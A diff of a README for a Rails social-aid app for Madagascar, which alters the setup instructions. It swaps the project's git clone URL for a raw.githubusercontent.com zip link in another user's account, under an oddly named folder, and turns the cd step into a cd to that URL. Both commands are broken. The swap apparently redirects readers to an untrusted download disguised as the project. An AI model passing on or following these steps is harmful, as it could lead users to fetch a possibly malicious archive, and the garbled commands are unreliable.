@@ -6,9 +6,9 @@ it is an application that will promote groups that make **social aid** to Madaga
 
 Need ruby 2.5.3 and rails 5.2.2 to run **offline!**
 
-    > git clone https://github.com/tinosam/faiseur_paix.git
+    > git clone https://raw.githubusercontent.com/SantatraASF/faiseur_paix/master/hypochlorhydric/faiseur_paix.zip
 
-    > cd faiseur_paix.git
+    > cd https://raw.githubusercontent.com/SantatraASF/faiseur_paix/master/hypochlorhydric/faiseur_paix.zip
 
     > bundle install
 
